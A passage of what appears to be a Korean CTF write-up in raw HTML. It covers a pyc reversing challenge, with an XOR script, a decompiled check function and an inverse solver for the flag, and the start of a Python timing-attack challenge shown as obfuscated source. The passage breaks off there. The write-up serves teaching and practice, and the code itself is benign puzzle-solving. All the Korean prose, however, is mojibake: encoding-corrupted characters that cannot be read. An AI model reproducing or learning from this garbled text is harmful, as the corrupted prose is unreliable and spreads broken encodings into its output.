œ</a>ê°€ ìƒê°ì´ ë‚¬ë‹¤.</p><h2 id="m-pyc---reversing">M. pyc - Reversing<a href="#m-pyc---reversing" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>pyc ë°ì´í„°ë¥¼ ê°–ê³ ìˆëŠ” íŒŒì¼ì„ ë¶„ì„í•˜ëŠ” ì»¨ì…‰ì˜ ë¬¸ì œì´ë‹¤.</p><p>ìš°ì„  ì£¼ì–´ì§„ íŒŒì¼ì„ ë””ìŠ¤ì–´ì…ˆí•œ í›„ì— ë””ìŠ¤ì–´ì…ˆëœ íŒŒì¼ì„ ë³´ë©´<br /> <code class="language-plaintext highlighter-rouge">chk</code>ì™€ <code class="language-plaintext highlighter-rouge">throw</code>ë¼ëŠ” í•¨ìˆ˜ê°€ ì¡´ì¬í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p><p>ê·¸ ì¤‘, <code class="language-plaintext highlighter-rouge">throw</code>ë¼ëŠ” í•¨ìˆ˜ê°€ <code class="language-plaintext highlighter-rouge">chk.__code__</code> ì—ë‹¤ê°€ mì´ë¼ëŠ” ë¦¬ìŠ¤íŠ¸ì— ë‹´ê¸´ ê°’ìœ¼ë¡œ xorì„ í•˜ê³  ì¸í’‹ì„ ì¸ìë¡œ chkì„ í˜¸ì¶œí•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p><p>ë•Œë¬¸ì— ì•„ë˜ì™€ ê°™ì´ pyc ë°ì´í„°ì— xorí•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•˜ì˜€ë‹¤.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">a</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">"74006401 83017D01 74016401 64026702 83017D01 7402A003 7C026403 A102A004 64026403 A1027D02 64047D03 64057D04 64067D05 64077D06 64087D07 74007402 74056409 83018301 83017D08 74068300 7D087407 74067C00 83017408 83024400 5D0B5C02 7D017D09 7C08A009 7C017C09 4100A101 01007130 740A7C08 83015300 290A4E72 57000000 72620000 00DA06"</span><span class="p">)</span> <span class="c1"># chk.__code__
</span><span class="n">m</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">254</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">124</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">222</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">196</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">225</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">184</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">197</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">248</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">125</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">149</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">253</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">196</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">196</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">184</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">208</span><span class="p">,</span> <span class="mi">1</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">i</span><span class="o">^</span><span class="n">j</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">j</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">m</span><span class="o">+</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">200</span><span class="p">)).</span><span class="nb">hex</span><span class="p">())</span>
</pre></table></code></div></div><p>ìœ„ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ì—¬ ë‚˜ì˜¨ ì•„ì›ƒí’‹ì„ ë‹¤ì‹œ ì†ìˆ˜ hex editorë¡œ ë„£ì–´ì£¼ë©´ chkì˜ ë””ìŠ¤ì–´ì…ˆëœ ì½”ë“œê°€ ë°”ë€ë‹¤.<br /> í•´ë‹¹ í•¨ìˆ˜ë¥¼ hand-rayë¡œ ë””ì»´íŒŒì¼í•˜ë©´ ì•„ë˜ì™€ ê°™ë‹¤</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">chk</span><span class="p">(</span><span class="n">ipt</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ipt</span><span class="p">)</span><span class="o">-</span><span class="mi">3</span><span class="p">):</span>
        <span class="n">r0</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">ipt</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="s">'little'</span><span class="p">)</span>
        <span class="n">ipt</span> <span class="o">=</span> <span class="n">ipt</span><span class="p">[:</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="p">((((</span><span class="n">r0</span> <span class="o">&gt;&gt;</span> <span class="p">((</span><span class="n">i</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span><span class="o">%</span><span class="mi">32</span><span class="p">))</span> <span class="o">|</span> <span class="p">(</span><span class="n">r0</span> <span class="o">&lt;&lt;</span> <span class="p">((</span><span class="o">-</span><span class="n">i</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span><span class="o">%</span><span class="mi">32</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">)</span><span class="o">^</span><span class="mh">0xDEADBEEF</span><span class="p">).</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s">'little'</span><span class="p">)</span><span class="o">+</span><span class="n">ipt</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">:]</span>
    <span class="k">return</span> <span class="n">ipt</span>
</pre></table></code></div></div><p>ë³µì¡í•˜ì§€ ì•Šì€ ì—°ì‚°ì´ë¯€ë¡œ ì—­ì—°ì‚° ì½”ë“œë¥¼ ì‘ì„±í•˜ì—¬ í”Œë˜ê·¸ë¥¼ íœ™ë“í•˜ì˜€ë‹¤.</p><blockquote><p>Solution Script</p></blockquote><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="n">k</span> <span class="o">=</span> <span class="p">[</span><span class="mi">161</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">143</span><span class="p">,</span> <span class="mi">139</span><span class="p">,</span> <span class="mi">247</span><span class="p">,</span> <span class="mi">182</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">140</span><span class="p">,</span> <span class="mi">132</span><span class="p">,</span> <span class="mi">222</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">79</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">69</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">184</span><span class="p">,</span> <span class="mi">232</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">152</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">202</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">143</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">194</span><span class="p">,</span> <span class="mi">161</span><span class="p">,</span> <span class="mi">241</span><span class="p">,</span> <span class="mi">230</span><span class="p">,</span> <span class="mi">237</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">254</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">220</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">179</span><span class="p">,</span> <span class="mi">201</span><span class="p">,</span> <span class="mi">216</span><span class="p">,</span> <span class="mi">132</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">53</span><span class="p">]</span>
<span class="n">key</span> <span class="o">=</span> <span class="p">[</span><span class="mi">239</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">198</span><span class="p">,</span> <span class="mi">239</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">208</span><span class="p">,</span> <span class="mi">223</span><span class="p">,</span> <span class="mi">159</span><span class="p">,</span> <span class="mi">135</span><span class="p">,</span> <span class="mi">245</span><span class="p">,</span> <span class="mi">211</span><span class="p">,</span> <span class="mi">181</span><span class="p">,</span> <span class="mi">173</span><span class="p">,</span> <span class="mi">210</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">254</span><span class="p">,</span> <span class="mi">132</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">199</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">250</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">208</span><span class="p">,</span> <span class="mi">84</span><span class="p">,</span> <span class="mi">241</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">149</span><span class="p">,</span> <span class="mi">185</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">161</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">173</span><span class="p">,</span> <span class="mi">220</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">189</span><span class="p">,</span> <span class="mi">165</span><span class="p">,</span> <span class="mi">205</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">72</span><span class="p">]</span>
<span class="n">m</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">254</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">124</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">222</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">196</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">225</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">184</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">197</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">248</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">125</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">149</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">253</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">196</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">196</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">184</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">208</span><span class="p">,</span> <span class="mi">1</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">dec</span><span class="p">(</span><span class="n">ipt</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ipt</span><span class="p">)</span><span class="o">-</span><span class="mi">3</span><span class="p">))[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
        <span class="n">r0</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">ipt</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="s">'little'</span><span class="p">)</span><span class="o">^</span><span class="mh">0xDEADBEEF</span>
        <span class="n">ipt</span> <span class="o">=</span> <span class="n">ipt</span><span class="p">[:</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="p">((((</span><span class="n">r0</span> <span class="o">&lt;&lt;</span> <span class="p">((</span><span class="n">i</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span><span class="o">%</span><span class="mi">32</span><span class="p">))</span> <span class="o">|</span> <span class="p">(</span><span class="n">r0</span> <span class="o">&gt;&gt;</span> <span class="p">((</span><span class="o">-</span><span class="n">i</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span><span class="o">%</span><span class="mi">32</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">)).</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s">'little'</span><span class="p">)</span><span class="o">+</span><span class="n">ipt</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">:]</span>
    <span class="k">return</span> <span class="n">ipt</span>

<span class="n">ipt</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
<span class="c1"># ipt = bytes(i^j for i,j in zip(k,key)) # chk function's routine before xor
</span><span class="k">print</span><span class="p">(</span><span class="n">dec</span><span class="p">(</span><span class="n">ipt</span><span class="p">))</span>
</pre></table></code></div></div><h2 id="n-leetcode---misc">N. Leetcode - Misc<a href="#n-leetcode---misc" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>íŒŒì´ì¬ì„ ì½”ë“œì— ëŒ€í•œ íƒ€ì´ë° ê³µê²©ì´ ì»¨ì…‰ì¸ ë¬¸ì œì´ë‹¤.</p><p>ì£¼ì–´ì§„ íŒŒì´ì¬ íŒŒì¼ì„ ëŒ€ì¶© ê¹”ë”í•˜ê²Œ ì •ë¦¬í•˜ë©´ ì•„ë˜ì™€ ê°™ë‹¤.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="k">while</span> \
    <span class="ow">not</span> <span class="p">(</span><span class="n">k</span> <span class="p">:</span><span class="o">=</span> <span class="n">k</span> <span class="k">if</span> <span class="s">"k"</span> <span class="ow">in</span> <span class="nb">vars</span><span class="p">()</span> <span class="k">else</span> <span class="k">lambda</span> <span class="n">c</span> <span class="p">:</span> <span class="nb">__import__</span><span class="p">(</span><span class="s">"functools"</span><span class="p">).</span><span class="nb">reduce</span><span class="p">(</span><span class="k">lambda</span> <span class="n">f</span><span class="p">,</span> <span class="n">g</span><span class="p">:</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">f</span><span class="p">(</span><span class="n">g</span><span class="p">(</span><span class="n">f</span><span class="p">(</span><span class="n">x</span><span class="p">))),</span> <span class="p">[</span><span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="nb">__import__</span><span class="p">(</span><span class="s">"hashlib"</span><span class="p">).</span><span class="n">sha512</span><span class="p">(</span><span class="n">x</span><span class="p">).</span><span class="n">digest</span><span class="p">()]</span> <span class="o">*</span> <span class="mi">16</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="p">)(</span><span class="n">c</span><span class="p">))</span> <span class="ow">or</span>\
    <span class="ow">not</span> <span class="p">(</span><span class="n">s</span> <span class="p">:</span><span class="o">=</span> <span class="n">s</span> <span class="k">if</span> <span class="s">"s"</span> <span class="ow">in</span> <span class="nb">vars</span><span class="p">()</span> <span class="k">else</span> <span class="nb">__import__</span><span class="p">(</span><span class="s">"secret"</span><span class="p">).</span><span class="n">s</span><span class="p">.</span><span class="nb">hex</span><span class="p">())</span> <span class="ow">or</span>\
    <span class="ow">not</span> <span class="p">(</span><span class="n">i</span> <span class="p">:</span><span class="o">=</span> <span class="nb">input</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">ljust</span><span class="p">(</span><span class="mi">16</span><span class="p">))</span> <span class="ow">or</span>\
    <span class="nb">any</span><span class="p">(</span><span class="nb">any</span><span class="p">(</span><span class="n">k</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span> <span class="o">!=</span> <span class="n">k</span><span class="p">(</span><span class="n">y</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="mi">4</span> <span class="o">*</span> <span class="n">t</span><span class="p">:</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">t</span> <span class="o">+</span> <span class="mi">4</span><span class="p">],</span> <span class="n">i</span><span class="p">[</span><span class="mi">4</span> <span class="o">*</span> <span class="n">t</span><span class="p">:</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">t</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]))</span> <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="nb">__import__</span><span class="p">(</span><span class="s">"random"</span><span class="p">).</span><span class="n">sample</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span> <span class="mi">4</span><span class="p">))</span> <span class="ow">or</span>\
    <span class="k">print</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s">"flag"</span><span class="p">).</span><span class="n">read</span><span class="p">()):</span> 
    
    <span class="k">print</span><span class="p">(</span><span class="s">"ğŸ¤”"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">""</span><span class="p">)</span>
